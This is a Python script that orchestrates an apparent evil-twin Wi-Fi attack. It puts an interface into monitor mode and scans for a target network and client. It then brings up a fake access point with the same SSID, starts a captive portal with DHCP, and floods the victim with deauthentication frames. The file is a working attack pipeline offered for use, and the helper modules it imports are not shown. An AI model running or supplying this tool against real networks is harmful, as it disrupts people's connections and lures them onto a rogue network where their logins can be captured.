from find_target import scan_wifi_networks
from dhcp_server import start_captive_portal
from deauthentication_attack import send_deauth
import subprocess

INTERFACE = "wlp4s0f4u1"
MONITOR_SCRIPT = "./set_monitor.sh"
MASTER_SCRIPT = "./set_master.sh"
HOSTAPD_SCRIPT = "./start_network.sh"  # This is your Bash script

def wait_for_enter():
    input("⏸️ Press Enter to continue...\n")

def enable_monitor_mode():
    print(f"[*] Enabling monitor mode using {MONITOR_SCRIPT}...")
    try:
        subprocess.run([MONITOR_SCRIPT, INTERFACE], check=True)
    except subprocess.CalledProcessError:
        print(f"❌ Failed to enable monitor mode on {INTERFACE}")
        exit(1)

def enable_master_mode():
    print(f"[*] Enabling master mode using {MASTER_SCRIPT}...")
    try:
        subprocess.run([MASTER_SCRIPT, INTERFACE], check=True)
    except subprocess.CalledProcessError:
        print(f"❌ Failed to enable master mode on {INTERFACE}")
        exit(1)

def start_hostapd(ssid):
    print(f"[*] Running start_hostapd('{ssid}') from Bash script...")
    try:
        subprocess.run(["bash", "start_network.sh", "run_function", "start_hostapd", ssid], check=True)
    except subprocess.CalledProcessError:
        print("❌ Failed to run start_hostapd from script.")
        exit(1)

def main():
    # Step 0: Switch to monitor mode
    print("🚀 Step 0: Set monitor mode")
    enable_monitor_mode()

    print("\n🚀 Step 1: Scanning Wi-Fi Networks")
    bssid, ssid, client_mac = scan_wifi_networks()

    if not bssid or not ssid or not client_mac:
        print("❌ Failed to select network/client.")
        return
    wait_for_enter()

    # Step 1.5: Switch to managed (master) mode
    enable_master_mode()

    print("\n🚀 Step 2: Starting Hostapd (Fake AP)")
    start_hostapd(ssid)
    wait_for_enter()

    print("\n🚀 Step 3: Launching Captive Portal with DHCP")
    start_captive_portal()
    wait_for_enter()

    print("\n🚀 Step 4: Sending Deauthentication Attack")
    send_deauth(target_mac=client_mac, ap_mac=bssid, iface=INTERFACE, count=100, interval=0.1)

    print("\n✅ All steps completed successfully.")

if __name__ == "__main__":
    main()
